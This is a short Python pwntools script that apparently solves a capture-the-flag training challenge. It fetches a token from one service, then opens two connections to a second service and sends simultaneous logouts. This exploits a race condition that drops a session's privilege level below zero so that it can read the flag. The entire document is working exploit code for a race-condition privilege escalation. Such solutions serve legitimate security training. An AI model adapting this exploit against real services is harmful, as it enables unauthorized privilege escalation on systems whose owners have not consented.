from pwn import *

def get_token(c):
  c.recvuntil(b"token: ")
  return c.recvline().strip() # strip to remove the \n 

def login(c):
  c.recvuntil(b"> ")
  c.sendline(b"1")
  c.recvuntil(b"Enter username: ")
  c.sendline(b"user")
  c.recvuntil(b"Enter password: ")
  c.sendline(b"supersecurepassword")
  print(c.recvline())

def get_flag(c):
  c.recvuntil(b"> ")
  c.sendline(b"4")
  c.recvline()
  return c.recvline().strip()

# Open the first connection to get the token
c_token = remote("underprivileged.training.offensivedefensive.it", 8080, ssl=True)
token = get_token(c_token)
c_token.close()
print(token)

# Open connection 1 to login and logout to put priviledge_level=0
c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_1.recvuntil(b"Token: ")
c_1.sendline(token)

# Open connection 2 to logount again and decrease priviledge_level=-1
c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)
c_2.recvuntil(b"Token: ")
c_2.sendline(token)

while(1):
  login(c_1)
  # Do the logout manually to ensure that the programs are the same line of execution, to trigger the race condition
  c_1.recvuntil(b"> ")
  c_2.recvuntil(b"> ")
  c_1.sendline(b"2")
  c_2.sendline(b"2")
  print(get_flag(c_1))
